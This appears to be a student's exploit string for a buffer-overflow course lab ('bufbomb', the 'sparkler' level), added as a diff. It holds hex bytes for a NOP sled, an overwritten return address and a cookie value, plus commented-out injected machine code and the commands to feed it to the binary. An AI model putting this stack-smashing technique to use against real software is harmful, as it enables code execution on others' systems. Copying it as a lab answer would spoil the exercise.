@@ -1,0 +1,23 @@
+/* cat weichen_sparkler.txt | ./hex2raw > weichen_sparkler-raw.txt */
+/* cat weichen_sparkler-raw.txt | ./bufbomb -u weichen */
+
+90 90 90 90 90 90 90 90 
+90 90 90 90 90 90 90 90 
+90 90 90 90 90 90 90 90 
+90 90 90 90 90 90 90 90 
+90 90 90 90 90 90 90 90 
+00 00 00 00 7a 8b 04 08
+00 00 00 00 02 e9 dc 74
+
+/*
+c7 05 0c 30 68 55 02 90
+b8 7a 8b 04 08 ff e0 90
+02 e9 dc 74 02 e9 dc 74
+02 e9 dc 74 02 e9 dc 74
+02 e9 dc 74 02 e9 dc 74
+00 00 00 00 d8 2f 68 55
+00 00 00 00 02 e9 dc 74
+*/
+
+/* 02 e9 dc 74 7a 8b 04 08  */ /* 0x8048b7a */
+/* 02 e9 dc 74 */
